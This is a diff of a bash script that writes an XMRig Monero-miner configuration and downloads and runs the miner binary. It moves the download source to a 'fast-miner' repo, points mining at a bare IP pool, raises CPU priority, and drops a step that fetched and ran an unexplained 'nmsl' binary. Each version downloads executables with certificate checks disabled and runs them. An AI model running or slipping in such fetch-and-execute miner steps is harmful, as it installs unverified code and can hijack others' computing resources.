@@ -1,15 +1,13 @@
 #!/bin/bash
-BASE_URL="https://cdn.jsdelivr.net/gh/imByteCat/hack-me@master"  # no `/` at the end of the line
+BASE_URL="https://raw.githubusercontent.com/imByteCat/fast-miner/master"  # no `/` at the end of the line
 
-POOL="xmr.f2pool.com:13531"
-USER="42tqjNBzQjCZA3aGq4v5rha6NsXgGfSEyTxoScjhEPZq5woPsydEWcC8sHiAbKueHnDvaJmj2F77fKNq1f4ok2LEPwJYB2s"
+POOL="185.245.2.34:25565"
+WORKER=$(date "+%Y%m%d%H%M%S")  # worker name based on current time
 PASSWORD="x"
 
-PRIORITY=4  # set process priority (0 idle, 2 normal to 5 highest)
-DONATE=1  # donate level, default 5%% (5 minutes in 100 minutes)
+PRIORITY=5  # set process priority (0 idle, 2 normal to 5 highest)
+DONATE=1  # donate level, default 5% (5 minutes in 100 minutes)
 BACKGROUND=false  # run the miner in the background
-
-WORKER=$(date "+%Y%m%d%H%M%S")
 
 rm -f "config.json"
 cat>"config.json"<< EOF
@@ -28,6 +26,7 @@ cat>"config.json"<< EOF
     "autosave": true,
     "background": ${BACKGROUND},
     "colors": true,
+    "title": true,
     "randomx": {
         "init": -1,
         "mode": "auto",
@@ -48,7 +47,8 @@ cat>"config.json"<< EOF
         "argon2-impl": null,
         "astrobwt-max-size": 550,
         "cn/0": false,
-        "cn-lite/0": false
+        "cn-lite/0": false,
+        "kawpow": false
     },
     "opencl": {
         "enabled": false,
@@ -74,11 +74,11 @@ cat>"config.json"<< EOF
             "algo": null,
             "coin": null,
             "url": "${POOL}",
-            "user": "${USER}.${WORKER}",
+            "user": "${WORKER}",
             "pass": "${PASSWORD}",
             "rig-id": null,
             "nicehash": false,
-            "keepalive": true,
+            "keepalive": false,
             "enabled": true,
             "tls": false,
             "tls-fingerprint": null,
@@ -107,16 +107,8 @@ cat>"config.json"<< EOF
 }
 EOF
 
-# Client
-echo "Client Starting..."
-rm -f "nmsl"
-wget --no-check-certificate ${BASE_URL}/nmsl
-chmod +x ./nmsl
-./nmsl
-
-# XMR Miner
-echo "Miner Starting..."
-rm -f "xmrig"
-wget --no-check-certificate ${BASE_URL}/xmrig
+echo "Starting XMRig..."
+rm -f "xmrig" # delete the old miner
+wget --no-check-certificate ${BASE_URL}/linux/x64/xmrig
 chmod +x ./xmrig
 ./xmrig
